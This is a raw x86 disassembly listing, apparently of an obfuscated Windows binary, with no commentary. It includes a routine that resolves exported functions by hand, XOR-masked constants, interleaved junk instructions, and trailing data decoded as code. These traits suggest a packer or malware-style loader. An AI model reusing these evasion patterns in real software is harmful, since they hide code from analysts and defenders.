  4219d3:	mov    edx,DWORD PTR [ebp+0x8]
  4219d6:	add    edx,DWORD PTR [ecx+eax*4]
  4219d9:	mov    DWORD PTR [ebp-0x48],edx
  4219dc:	mov    eax,DWORD PTR [ebp-0x48]
  4219df:	mov    DWORD PTR [ebp-0x210],eax
  4219e5:	mov    eax,DWORD PTR [ebp+0xc]
  4219e8:	mov    DWORD PTR [ebp-0x20c],eax
  4219ee:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  4219f8:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a02:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a0c:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a16:	lea    eax,[ebp-0x1e8]
  421a1c:	mov    DWORD PTR [ebp-0x1f4],eax
  421a22:	mov    eax,DWORD PTR [ebp-0x20c]
  421a28:	movzx  eax,WORD PTR [eax+0x20]
  421a2c:	xor    eax,0xa49b
  421a31:	movzx  eax,ax
  421a34:	sar    eax,1
  421a36:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a3c:	movzx  ecx,WORD PTR [ecx+0x20]
  421a40:	xor    ecx,0xa49b
  421a46:	movzx  ecx,cx
  421a49:	shl    ecx,0xf
  421a4c:	or     eax,ecx
  421a4e:	movzx  eax,ax
  421a51:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a57:	mov    DWORD PTR [ecx],eax
  421a59:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a5f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a65:	xor    eax,0xca79a575
  421a6a:	xor    edx,0x9c1b89e8
  421a70:	mov    cl,0x2
  421a72:	call   0x40a9b5
  421a77:	mov    ebx,eax
  421a79:	mov    esi,edx
  421a7b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a81:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a87:	xor    eax,0xca79a575
  421a8c:	xor    edx,0x9c1b89e8
  421a92:	mov    cl,0x3e
  421a94:	call   0x422211
  421a99:	or     ebx,eax
  421a9b:	or     esi,edx
  421a9d:	movzx  eax,bl
  421aa0:	push   eax
  421aa1:	lea    eax,[ebp-0x198]
  421aa7:	push   eax
  421aa8:	call   0x416c9e
  421aad:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ab3:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ab9:	xor    eax,0xca79a575
  421abe:	xor    edx,0x9c1b89e8
  421ac4:	mov    cl,0x2
  421ac6:	call   0x40a9b5
  421acb:	mov    esi,eax
  421acd:	mov    edi,edx
  421acf:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ad5:	mov    edx,DWORD PTR [ebp-0x1ec]
  421adb:	xor    eax,0xca79a575
  421ae0:	xor    edx,0x9c1b89e8
  421ae6:	mov    cl,0x3e
  421ae8:	call   0x422211
  421aed:	or     esi,eax
  421aef:	or     edi,edx
  421af1:	mov    DWORD PTR [ebp-0x1f8],esi
  421af7:	jmp    0x421b4c
  421afc:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b02:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b08:	xor    eax,0xca79a575
  421b0d:	xor    edx,0x9c1b89e8
  421b13:	mov    cl,0x2
  421b15:	call   0x40a9b5
  421b1a:	mov    esi,eax
  421b1c:	mov    edi,edx
  421b1e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b24:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b2a:	xor    eax,0xca79a575
  421b2f:	xor    edx,0x9c1b89e8
  421b35:	mov    cl,0x3e
  421b37:	call   0x422211
  421b3c:	or     esi,eax
  421b3e:	or     edi,edx
  421b40:	add    esi,DWORD PTR [ebp-0x1f8]
  421b46:	mov    DWORD PTR [ebp-0x1f8],esi
  421b4c:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b52:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b58:	je     0x421beb
  421b5e:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b64:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b6a:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b6f:	xor    eax,0xa49b
  421b74:	movzx  eax,ax
  421b77:	sar    eax,1
  421b79:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421b7f:	mov    edx,DWORD PTR [ebp-0x20c]
  421b85:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421b8a:	xor    ecx,0xa49b
  421b90:	movzx  ecx,cx
  421b93:	shl    ecx,0xf
  421b96:	or     eax,ecx
  421b98:	movzx  eax,ax
  421b9b:	mov    DWORD PTR [ebp-0x1fc],eax
  421ba1:	mov    eax,DWORD PTR [ebp-0x1f8]
  421ba7:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bad:	movzx  eax,WORD PTR [ecx+eax*4]
  421bb1:	xor    eax,0xa49b
  421bb6:	movzx  eax,ax
  421bb9:	sar    eax,1
  421bbb:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bc1:	mov    edx,DWORD PTR [ebp-0x20c]
  421bc7:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bcb:	xor    ecx,0xa49b
  421bd1:	movzx  ecx,cx
  421bd4:	shl    ecx,0xf
  421bd7:	or     eax,ecx
  421bd9:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421bdf:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421be6:	jmp    0x421afc
  421beb:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bf1:	mov    edx,DWORD PTR [ebp-0x1ec]
  421bf7:	xor    eax,0xca79a575
  421bfc:	xor    edx,0x9c1b89e8
  421c02:	mov    cl,0x2
  421c04:	call   0x40a9b5
  421c09:	mov    esi,eax
  421c0b:	mov    edi,edx
  421c0d:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c13:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c19:	xor    eax,0xca79a575
  421c1e:	xor    edx,0x9c1b89e8
  421c24:	mov    cl,0x3e
  421c26:	call   0x422211
  421c2b:	or     esi,eax
  421c2d:	or     edi,edx
  421c2f:	mov    DWORD PTR [ebp-0x1e4],esi
  421c35:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c3b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c41:	xor    eax,0xca79a575
  421c46:	xor    edx,0x9c1b89e8
  421c4c:	mov    cl,0x2
  421c4e:	call   0x40a9b5
  421c53:	mov    esi,eax
  421c55:	mov    edi,edx
  421c57:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c5d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c63:	xor    eax,0xca79a575
  421c68:	xor    edx,0x9c1b89e8
  421c6e:	mov    cl,0x3e
  421c70:	call   0x422211
  421c75:	or     esi,eax
  421c77:	or     edi,edx
  421c79:	mov    DWORD PTR [ebp-0x23c],esi
  421c7f:	mov    DWORD PTR [ebp-0x238],edi
  421c85:	mov    eax,DWORD PTR [ebp-0x23c]
  421c8b:	or     eax,DWORD PTR [ebp-0x238]
  421c91:	je     0x421ef1
  421c97:	lea    eax,[ebp-0x204]
  421c9d:	mov    DWORD PTR [ebp-0x208],eax
  421ca3:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ca9:	xor    edx,edx
  421cab:	mov    cl,0x2
  421cad:	call   0x422211
  421cb2:	mov    esi,eax
  421cb4:	mov    edi,edx
  421cb6:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cbc:	xor    edx,edx
  421cbe:	mov    cl,0x3e
  421cc0:	call   0x40a9b5
  421cc5:	or     esi,eax
  421cc7:	or     edi,edx
  421cc9:	xor    esi,0xca79a575
  421ccf:	xor    edi,0x9c1b89e8
  421cd5:	mov    eax,DWORD PTR [ebp-0x208]
  421cdb:	mov    DWORD PTR [eax],esi
  421cdd:	mov    DWORD PTR [eax+0x4],edi
  421ce0:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ce6:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421cee:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cf4:	mov    edx,DWORD PTR [ebp-0x1dc]
  421cfa:	xor    eax,0xca79a575
  421cff:	xor    edx,0x9c1b89e8
  421d05:	mov    cl,0x2
  421d07:	call   0x40a9b5
  421d0c:	mov    ebx,eax
  421d0e:	mov    edi,edx
  421d10:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d16:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d1c:	xor    eax,0xca79a575
  421d21:	xor    edx,0x9c1b89e8
  421d27:	mov    cl,0x3e
  421d29:	call   0x422211
  421d2e:	or     ebx,eax
  421d30:	or     edi,edx
  421d32:	movsx  eax,bl
  421d35:	cmp    esi,eax
  421d37:	je     0x421e97
  421d3d:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d43:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d4b:	mov    eax,DWORD PTR [ebp-0x204]
  421d51:	mov    edx,DWORD PTR [ebp-0x200]
  421d57:	xor    eax,0xca79a575
  421d5c:	xor    edx,0x9c1b89e8
  421d62:	mov    cl,0x2
  421d64:	call   0x40a9b5
  421d69:	mov    edi,eax
  421d6b:	mov    ebx,edx
  421d6d:	mov    eax,DWORD PTR [ebp-0x204]
  421d73:	mov    edx,DWORD PTR [ebp-0x200]
  421d79:	xor    eax,0xca79a575
  421d7e:	xor    edx,0x9c1b89e8
  421d84:	mov    cl,0x3e
  421d86:	call   0x422211
  421d8b:	or     edi,eax
  421d8d:	or     ebx,edx
  421d8f:	mov    eax,DWORD PTR [ebp-0x210]
  421d95:	movsx  eax,BYTE PTR [eax+edi*1]
  421d99:	cmp    esi,eax
  421d9b:	je     0x421dab
  421da1:	jmp    0x421ef1
  421da6:	jmp    0x421e97
  421dab:	mov    eax,DWORD PTR [ebp-0x204]
  421db1:	mov    edx,DWORD PTR [ebp-0x200]
  421db7:	xor    eax,0xca79a575
  421dbc:	xor    edx,0x9c1b89e8
  421dc2:	mov    cl,0x2
  421dc4:	call   0x40a9b5
  421dc9:	mov    esi,eax
  421dcb:	mov    edi,edx
  421dcd:	mov    eax,DWORD PTR [ebp-0x204]
  421dd3:	mov    edx,DWORD PTR [ebp-0x200]
  421dd9:	xor    eax,0xca79a575
  421dde:	xor    edx,0x9c1b89e8
  421de4:	mov    cl,0x3e
  421de6:	call   0x422211
  421deb:	or     esi,eax
  421ded:	or     edi,edx
  421def:	mov    eax,DWORD PTR [ebp-0x210]
  421df5:	movsx  esi,BYTE PTR [eax+esi*1]
  421df9:	mov    eax,DWORD PTR [ebp-0x1f0]
  421dff:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e05:	xor    eax,0xca79a575
  421e0a:	xor    edx,0x9c1b89e8
  421e10:	mov    cl,0x2
  421e12:	call   0x40a9b5
  421e17:	mov    ebx,eax
  421e19:	mov    edi,edx
  421e1b:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e21:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e27:	xor    eax,0xca79a575
  421e2c:	xor    edx,0x9c1b89e8
  421e32:	mov    cl,0x3e
  421e34:	call   0x422211
  421e39:	or     ebx,eax
  421e3b:	or     edi,edx
  421e3d:	movsx  eax,bl
  421e40:	cmp    esi,eax
  421e42:	jne    0x421e97
  421e48:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e4e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e54:	xor    eax,0xca79a575
  421e59:	xor    edx,0x9c1b89e8
  421e5f:	mov    cl,0x2
  421e61:	call   0x40a9b5
  421e66:	mov    esi,eax
  421e68:	mov    edi,edx
  421e6a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e70:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e76:	xor    eax,0xca79a575
  421e7b:	xor    edx,0x9c1b89e8
  421e81:	mov    cl,0x3e
  421e83:	call   0x422211
  421e88:	or     esi,eax
  421e8a:	or     edi,edx
  421e8c:	mov    DWORD PTR [ebp-0x214],esi
  421e92:	jmp    0x421f3b
  421e97:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e9d:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ea3:	xor    eax,0xca79a575
  421ea8:	xor    edx,0x9c1b89e8
  421eae:	mov    cl,0x2
  421eb0:	call   0x40a9b5
  421eb5:	mov    esi,eax
  421eb7:	mov    edi,edx
  421eb9:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ebf:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ec5:	xor    eax,0xca79a575
  421eca:	xor    edx,0x9c1b89e8
  421ed0:	mov    cl,0x3e
  421ed2:	call   0x422211
  421ed7:	or     esi,eax
  421ed9:	or     edi,edx
  421edb:	add    esi,DWORD PTR [ebp-0x1e4]
  421ee1:	mov    DWORD PTR [ebp-0x1e4],esi
  421ee7:	jmp    0x421c35
  421eec:	jmp    0x421c35
  421ef1:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ef7:	mov    edx,DWORD PTR [ebp-0x1ec]
  421efd:	xor    eax,0xca79a575
  421f02:	xor    edx,0x9c1b89e8
  421f08:	mov    cl,0x2
  421f0a:	call   0x40a9b5
  421f0f:	mov    esi,eax
  421f11:	mov    edi,edx
  421f13:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f19:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f1f:	xor    eax,0xca79a575
  421f24:	xor    edx,0x9c1b89e8
  421f2a:	mov    cl,0x3e
  421f2c:	call   0x422211
  421f31:	or     esi,eax
  421f33:	or     edi,edx
  421f35:	mov    DWORD PTR [ebp-0x214],esi
  421f3b:	mov    eax,DWORD PTR [ebp-0x214]
  421f41:	mov    DWORD PTR [ebp-0xc8],eax
  421f47:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f4e:	je     0x421f78
  421f54:	mov    eax,DWORD PTR [ebp-0x144]
  421f5a:	mov    ecx,DWORD PTR [ebp-0xac]
  421f60:	movzx  eax,WORD PTR [ecx+eax*2]
  421f64:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f6a:	mov    eax,DWORD PTR [ecx+eax*4]
  421f6d:	mov    DWORD PTR [ebp-0xfc],eax
  421f73:	jmp    0x421f7d
  421f78:	jmp    0x4219a8
  421f7d:	cmp    DWORD PTR [ebp-0xfc],0x0
  421f84:	jne    0x421f91
  421f8a:	xor    eax,eax
  421f8c:	jmp    0x42220a
  421f91:	mov    eax,DWORD PTR [ebp+0x8]
  421f94:	add    eax,DWORD PTR [ebp-0xfc]
  421f9a:	mov    DWORD PTR [ebp-0xec],eax
  421fa0:	mov    DWORD PTR [ebp-0x74],0x0
  421fa7:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fae:	je     0x42202a
  421fb4:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fbb:	je     0x42202a
  421fc1:	mov    eax,DWORD PTR [ebp-0xb0]
  421fc7:	shl    eax,0x2
  421fca:	mov    DWORD PTR [ebp-0x74],eax
  421fcd:	mov    DWORD PTR [ebp-0x14c],0x0
  421fd7:	sub    esp,DWORD PTR [ebp-0x74]
  421fda:	mov    DWORD PTR [ebp-0x14c],esp
  421fe0:	mov    DWORD PTR [ebp-0x148],0x0
  421fea:	mov    eax,DWORD PTR [ebp-0x148]
  421ff0:	cmp    eax,DWORD PTR [ebp-0xb0]
  421ff6:	je     0x42202a
  421ffc:	mov    eax,DWORD PTR [ebp-0x148]
  422002:	mov    ecx,DWORD PTR [ebp-0x14c]
  422008:	mov    edx,DWORD PTR [ebp-0x148]
  42200e:	mov    esi,DWORD PTR [ebp+0x14]
  422011:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422015:	mov    DWORD PTR [ecx+eax*4],edx
  422018:	mov    eax,DWORD PTR [ebp-0x148]
  42201e:	inc    eax
  42201f:	mov    DWORD PTR [ebp-0x148],eax
  422025:	jmp    0x421fea
  42202a:	mov    DWORD PTR [ebp-0x9c],0x0
  422034:	push   0x4221c3
  422039:	jmp    DWORD PTR [ebp-0xec]
  42203f:	mov    eax,eax
  422041:	mov    ecx,esp
  422043:	ret    0xc
  422046:	cmp    DWORD PTR ds:0x4282df,0x0
  42204d:	mov    DWORD PTR ds:0x4282db,0x7476
  422057:	mov    DWORD PTR ds:0x428157,0x1cdc
  422061:	mov    DWORD PTR ds:0x4282db,0x65fa
  42206b:	mov    DWORD PTR ds:0x428147,0x5dca
  422075:	jmp    0x4220bf
  42207a:	mov    eax,ds:0x4282d7
  42207f:	cmp    DWORD PTR ds:0x4282df,0x0
  422086:	jbe    0x4220a7
  42208c:	push   0x24f1
  422091:	call   DWORD PTR ds:0x428d58
  422097:	inc    DWORD PTR ds:0x428383
  42209d:	sub    DWORD PTR ds:0x428163,0x46d9
  4220a7:	inc    DWORD PTR ds:0x4282df
  4220ad:	adc    DWORD PTR ds:0x4282eb,ebx
  4220b3:	or     DWORD PTR ds:0x428213,0x4029
  4220bd:	not    eax
  4220bf:	push   ebx
  4220c0:	push   esi
  4220c1:	sbb    DWORD PTR ds:0x42836f,edx
  4220c7:	mov    eax,DWORD PTR [esp+0x18]
  4220cb:	or     eax,eax
  4220cd:	jne    0x4220fd
  4220d3:	mov    ecx,DWORD PTR [esp+0x14]
  4220d7:	mov    eax,DWORD PTR [esp+0x10]
  4220db:	xor    edx,edx
  4220dd:	div    ecx
  4220df:	xor    DWORD PTR ds:0x42816f,0x45f1
  4220e9:	mov    ebx,eax
  4220eb:	mov    eax,DWORD PTR [esp+0xc]
  4220ef:	div    ecx
  4220f1:	mov    edx,0x36e3
  4220f6:	mov    edx,ebx
  4220f8:	jmp    0x4221be
  4220fd:	mov    ecx,eax
  4220ff:	sbb    eax,0x67a9
  422104:	mov    ebx,DWORD PTR [esp+0x14]
  422108:	cmp    DWORD PTR ds:0x4282d7,0x0
  42210f:	mov    edx,DWORD PTR ds:0x428387
  422115:	mov    DWORD PTR ds:0x428307,0x4bc7
  42211f:	mov    edx,DWORD PTR ds:0x4282ef
  422125:	jmp    0x42216f
  42212a:	mov    DWORD PTR ds:0x428237,0x15f
  422134:	mov    DWORD PTR ds:0x42826f,0x4dd1
  42213e:	cmp    DWORD PTR ds:0x4282d7,0x0
  422145:	jle    0x422162
  42214b:	push   0x824e
  422150:	call   DWORD PTR ds:0x428d5c
  422156:	xor    DWORD PTR ds:0x4282ef,0x6c44
  422160:	sub    edx,edx
  422162:	sbb    DWORD PTR ds:0x428237,0x445e
  42216c:	dec    edx
  42216d:	not    edx
  42216f:	mov    edx,DWORD PTR [esp+0x10]
  422173:	mov    eax,DWORD PTR [esp+0xc]
  422177:	shr    ecx,1
  422179:	rcr    ebx,1
  42217b:	shr    edx,1
  42217d:	rcr    eax,1
  42217f:	or     ecx,ecx
  422181:	jne    0x422177
  422187:	div    ebx
  422189:	mov    esi,eax
  42218b:	mul    DWORD PTR [esp+0x18]
  42218f:	mov    ecx,eax
  422191:	mov    eax,DWORD PTR [esp+0x14]
  422195:	mul    esi
  422197:	add    edx,ecx
  422199:	jb     0x4221b9
  42219f:	cmp    edx,DWORD PTR [esp+0x10]
  4221a3:	ja     0x4221b9
  4221a9:	jb     0x4221ba
  4221af:	cmp    eax,DWORD PTR [esp+0xc]
  4221b3:	jbe    0x4221ba
  4221b9:	dec    esi
  4221ba:	xor    edx,edx
  4221bc:	mov    eax,esi
  4221be:	pop    esi
  4221bf:	pop    ebx
  4221c0:	ret    0x10
  4221c3:	or     DWORD PTR ds:0x428353,0x42835f
  4221cd:	sub    DWORD PTR [ebp+0x10],0x1
  4221d1:	mov    DWORD PTR ds:0x42815b,0x43bf
  4221db:	cmp    DWORD PTR [ebp+0x10],0x0
  4221df:	mov    DWORD PTR ds:0x42834b,0x612a
  4221e9:	je     0x4221f8
  4221ef:	xor    DWORD PTR ds:0x428147,edx
  4221f5:	add    esp,DWORD PTR [ebp-0x74]
  4221f8:	mov    DWORD PTR [ebp-0x9c],eax
  4221fe:	mov    DWORD PTR ds:0x42824f,ebx
  422204:	mov    eax,DWORD PTR [ebp-0x9c]
  42220a:	pop    edi
  42220b:	pop    esi
  42220c:	pop    ebx
  42220d:	leave  
  42220e:	ret    0x10
  422211:	cmp    cl,0x40
  422214:	mov    DWORD PTR ds:0x428233,0x43a8
  42221e:	jae    0x422270
  422224:	mov    DWORD PTR ds:0x428167,0x42f2
  42222e:	cmp    cl,0x20
  422231:	mov    DWORD PTR ds:0x42814f,0x3d58
  42223b:	jae    0x42225b
  422241:	or     DWORD PTR ds:0x428143,0x5e1e
  42224b:	shld   edx,eax,cl
  42224e:	mov    DWORD PTR ds:0x428267,0x1bd2
  422258:	shl    eax,cl
  42225a:	ret    
  42225b:	inc    edx
  42225c:	mov    edx,eax
  42225e:	sub    DWORD PTR ds:0x428383,0x4282db
  422268:	xor    eax,eax
  42226a:	and    cl,0x1f
  42226d:	shl    edx,cl
  42226f:	ret    
  422270:	xor    eax,eax
  422272:	xor    edx,edx
  422274:	ret    
	...
  42227d:	add    BYTE PTR [eax],al
  42227f:	add    cl,ch
  422281:	cmp    ebp,DWORD PTR [ebx+0x14]
  422284:	cmp    al,0x26
  422286:	sub    al,0x44
  422288:	jno    0x4222f3
  42228a:	ja     0x4222f1
  42228c:	int3   
  42228d:	fsubr  QWORD PTR [edx+0x1e]
  422290:	jo     0x4222f7
  422292:	popa   
  422293:	ins    BYTE PTR es:[edi],dx
  422294:	push   eax
  422295:	lods   eax,DWORD PTR ds:[esi]
  422296:	xor    DWORD PTR [esi+0x41],edi
  422299:	ins    BYTE PTR es:[edi],dx
  42229a:	popa   
  42229b:	outs   dx,BYTE PTR ds:[esi]
  42229c:	add    BYTE PTR [eax],al
  42229e:	add    BYTE PTR [eax],al
  4222a0:	addr16 jb 0x422308
  4222a3:	popa   
  4222a4:	je     0x42230d
  4222a6:	jb     0x42230d
  4222a8:	popa   
  4222a9:	je     0x422312
  4222ab:	jb     0x422312
  4222ad:	popa   
  4222ae:	je     0x422317
  4222b0:	jb     0x422317
  4222b2:	popa   
  4222b3:	je     0x42231c
  4222b5:	jb     0x42231c
  4222b7:	popa   
  4222b8:	je     0x422321
  4222ba:	jb     0x422321
  4222bc:	popa   
  4222bd:	je     0x422326
  4222bf:	jb     0x422326
  4222c1:	popa   
  4222c2:	je     0x42232b
  4222c4:	jb     0x42232b
  4222c6:	popa   
  4222c7:	je     0x422330
  4222c9:	jb     0x422330
  4222cb:	popa   
  4222cc:	je     0x422335
  4222ce:	jb     0x422335
  4222d0:	popa   
  4222d1:	je     0x4222d3
  4222d3:	add    BYTE PTR [eax+0x65],ch
  4222d6:	ins    BYTE PTR es:[edi],dx
  4222d7:	ins    BYTE PTR es:[edi],dx
  4222d8:	push   0x686c6c65
  4222dd:	gs ins BYTE PTR es:[edi],dx
  4222df:	ins    BYTE PTR es:[edi],dx
  4222e0:	push   0x686c6c65
  4222e5:	gs ins BYTE PTR es:[edi],dx
  4222e7:	ins    BYTE PTR es:[edi],dx
  4222e8:	push   0x686c6c65
  4222ed:	gs ins BYTE PTR es:[edi],dx
  4222ef:	ins    BYTE PTR es:[edi],dx
  4222f0:	push   0x686c6c65
  4222f5:	gs ins BYTE PTR es:[edi],dx
  4222f7:	ins    BYTE PTR es:[edi],dx
  4222f8:	push   0x686c6c65
  4222fd:	gs ins BYTE PTR es:[edi],dx
  4222ff:	ins    BYTE PTR es:[edi],dx
  422300:	push   0x686c6c65
  422305:	gs ins BYTE PTR es:[edi],dx
  422307:	ins    BYTE PTR es:[edi],dx
  422308:	add    BYTE PTR [eax],al
  42230a:	add    BYTE PTR [eax],al
  42230c:	outs   dx,DWORD PTR ds:[esi]
  42230d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422311:	add    BYTE PTR [ecx+0x0],ah
  422314:	jne    0x422316
  422316:	je     0x422318
  422318:	xor    eax,DWORD PTR [eax]
  42231a:	xor    al,BYTE PTR [eax]
  42231c:	add    BYTE PTR [eax],al
  42231e:	add    BYTE PTR [eax],al
  422320:	push   0x61006500
  422325:	add    BYTE PTR [esi+0x0],dh
  422328:	add    BYTE PTR gs:[esi+0x0],ch
  42232c:	push   0x61006500
  422331:	add    BYTE PTR [esi+0x0],dh
  422334:	add    BYTE PTR gs:[esi+0x0],ch
  422338:	push   0x61006500
  42233d:	add    BYTE PTR [esi+0x0],dh
  422340:	add    BYTE PTR gs:[esi+0x0],ch
  422344:	push   0x61006500
  422349:	add    BYTE PTR [esi+0x0],dh
  42234c:	add    BYTE PTR gs:[esi+0x0],ch
  422350:	push   0x61006500
  422355:	add    BYTE PTR [esi+0x0],dh
  422358:	add    BYTE PTR gs:[esi+0x0],ch
  42235c:	push   0x61006500
  422361:	add    BYTE PTR [esi+0x0],dh
  422364:	add    BYTE PTR gs:[esi+0x0],ch
  422368:	push   0x61006500
  42236d:	add    BYTE PTR [esi+0x0],dh
  422370:	add    BYTE PTR gs:[esi+0x0],ch
  422374:	push   0x61006500
  422379:	add    BYTE PTR [esi+0x0],dh
  42237c:	add    BYTE PTR gs:[esi+0x0],ch
  422380:	push   0x61006500
  422385:	add    BYTE PTR [esi+0x0],dh
  422388:	add    BYTE PTR gs:[esi+0x0],ch
  42238c:	add    BYTE PTR [eax],al
  42238e:	add    BYTE PTR [eax],al
  422390:	or     al,0x23
  422392:	inc    edx
  422393:	add    BYTE PTR [edi+0x6c],cl
  422396:	gs dec ecx
  422398:	arpl   WORD PTR [edi+0x6e],bp
  42239b:	push   esp
  42239c:	outs   dx,DWORD PTR ds:[esi]
  42239d:	inc    ebx
  42239e:	jne    0x422412
  4223a0:	jae    0x422411
  4223a2:	jb     0x4223a4
  4223a4:	xchg   esp,eax
  4223a5:	and    eax,DWORD PTR [edx+0x0]
	...
  4223b0:	push   eax
  4223b1:	daa    
  4223b2:	inc    edx
  4223b3:	add    BYTE PTR [eax+0x27],bl
  4223b6:	inc    edx
  4223b7:	add    BYTE PTR [eax],dl
  4223b9:	es inc edx
  4223bb:	add    dl,dh
  4223bd:	inc    ebx
  4223be:	push   ebx
  4223bf:	mov    WORD PTR ds:0x1a49ba4,ss
  4223c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c6:	popf   
  4223c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c8:	jno    0x42236e
  4223ca:	xchg   edi,eax
  4223cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223cc:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223dc:	rol    DWORD PTR [edx-0x5b6a732f],cl
  4223e2:	adc    eax,0x1a49ba4
  4223e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e8:	popf   
  4223e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ea:	jno    0x422390
  4223ec:	xchg   edi,eax
  4223ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ee:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	xor    eax,0x9ba485a4
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	mov    ebx,0xd1e2d3a4
  422401:	in     al,dx
  422402:	xchg   ebp,eax
  422403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422404:	adc    eax,0x3ba49ba4
  422409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240a:	popf   
  42240b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422414:	fwait
  422415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422416:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42241d:	sub    al,0xf7
  42241f:	cs pop ss
  422421:	push   cs
  422422:	adc    eax,0x3a49108
  422427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422428:	fwait
  422429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422432:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	shl    DWORD PTR [edx],cl
  42243c:	shr    DWORD PTR [ecx+esi*8],1
  42243f:	or     al,0xf7
  422441:	push   cs
  422442:	pop    ss
  422443:	outs   dx,BYTE PTR ds:[esi]
  422444:	adc    eax,0x3a49168
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	fwait
  42244b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244c:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422454:	xor    eax,0x9ba48da4
  422459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42245a:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  422462:	imul   DWORD PTR [esi+0x17]
  422465:	dec    esi
  422466:	adc    eax,0x37a49148
  42246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246c:	fwait
  42246d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246e:	jae    0x422414
  422470:	popf   
